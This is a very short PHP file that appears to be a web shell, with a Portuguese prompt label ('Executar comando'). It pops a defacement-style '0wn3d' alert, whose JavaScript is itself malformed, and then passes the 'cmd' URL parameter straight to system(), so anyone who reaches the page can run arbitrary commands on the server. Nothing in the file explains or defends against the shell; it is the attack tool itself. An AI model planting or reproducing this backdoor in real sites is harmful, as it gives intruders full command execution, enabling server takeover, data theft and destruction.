<?php
echo "<script>alert(0wn3d !!);</script>";
echo "Executar comando: ".htmlspecialchars($_GET['cmd']);

system($_GET['cmd']);
?>
